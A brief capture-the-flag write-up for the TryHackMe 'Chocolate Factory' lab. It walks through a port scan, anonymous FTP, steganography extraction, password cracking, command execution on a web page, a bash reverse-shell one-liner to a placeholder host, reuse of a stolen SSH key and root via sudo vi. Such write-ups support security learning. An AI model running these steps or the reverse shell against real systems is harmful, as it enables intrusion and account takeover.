# Chocolate-Factory-THM

scan the network- Useful ports:-
1) 21/tcp  open  ftp        syn-ack vsftpd 3.0.3
2) 22/tcp  open  ssh        syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
3) 80/tcp  open  http       syn-ack Apache httpd 2.4.29 ((Ubuntu))

Uncessary ports:-
1) 100/tcp open  newacct?   syn-ack
2) 106/tcp open  pop3pw?    syn-ack
3) 109/tcp open  pop2?      syn-ack
4) 110/tcp open  pop3?      syn-ack
5) 111/tcp open  rpcbind?   syn-ack
6) 113/tcp open  ident?     syn-ack
7) 119/tcp open  nntp?      syn-ack
8) 125/tcp open  locus-map? syn-ack

After directory fuzzing i found home.php, index.php.bak, key_rev_key and many more

but port no 113 in found a url which is the key and your Q1 answer.


login through anonymous in ftp a found a picture

use steghide tool to extract the text file in the image without the password

$steghide extract -sf picture.jpg

In the text file i get user and their pass 

i crack the password hash through john 

i get the password.

Open port 80 and get the login page.

login through username and password.

In website we try to ls, pwd and get the information then i use bash reverse connection command: 
[bash -c 'exec bash -i &>/dev/tcp/ip/4444 <&1']

Get shell!

I found ssh pub and pri key then i copy the pri key which is id_rsa and use in own machine.

And i get the username which is charlie

found user.txt! 

when i use sudo -l,

i get the vi vulnerable binary

i use this binary and i get the root.

find root.txt but the file is protected by a key, but the key is available in the above url(also Q1 answer)

I get last flag and finally go to bed.:)

